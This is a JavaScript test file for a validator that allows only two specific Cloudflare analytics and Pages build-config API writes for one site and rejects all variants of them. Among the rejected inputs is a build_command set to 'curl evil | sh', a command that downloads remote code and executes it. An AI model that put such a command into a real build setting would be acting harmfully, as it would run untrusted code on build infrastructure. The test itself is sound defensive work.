import test from 'node:test';
import assert from 'node:assert/strict';
import { isApprovedAnalyticsMutation as ok } from './analytics-mutation.mjs';

const accountId = 'a'.repeat(32), pagesProjectName = 'esp-willow-site', acct = '/accounts/' + accountId;
const create = {method: 'POST', path: acct + '/rum/site_info', requestBody: {host: 'esp-willow-site.pages.dev', auto_install: false}, accountId, pagesProjectName};
const cfg = {build_command: '', destination_dir: 'public', root_dir: '/', web_analytics_tag: 'c'.repeat(32), web_analytics_token: 'd'.repeat(32)};
const patch = {method: 'PATCH', path: acct + '/pages/projects/esp-willow-site', requestBody: {build_config: cfg}, accountId, pagesProjectName};

test('allows exactly the two visitor-insights writes for this site', () => {
  assert.equal(ok(create), true);
  assert.equal(ok(patch), true);
});

test('refuses any other host, account, project, method, extra field or build setting', () => {
  for (const bad of [
    {...create, requestBody: {host: 'evil.example', auto_install: false}},
    {...create, requestBody: {host: 'esp-willow-site.pages.dev', auto_install: true}},
    {...create, requestBody: {host: 'esp-willow-site.pages.dev', auto_install: false, extra: 1}},
    {...create, path: '/accounts/' + 'b'.repeat(32) + '/rum/site_info'},
    {...create, method: 'PUT'},
    {...patch, path: acct + '/pages/projects/esp-other-site'},
    {...patch, requestBody: {build_config: {...cfg, build_command: 'curl evil | sh'}}},
    {...patch, requestBody: {build_config: {...cfg, destination_dir: '.'}}},
    {...patch, requestBody: {build_config: {...cfg, env_vars: {}}}},
    {...patch, requestBody: {build_config: cfg, production_branch: 'evil'}},
    {...patch, requestBody: {build_config: {...cfg, web_analytics_tag: 'nothex'}}},
    {...patch, method: 'DELETE'},
    {...patch, pagesProjectName: 'Bad Name'}
  ]) assert.equal(ok(bad), false, JSON.stringify(bad).slice(0, 120));
});
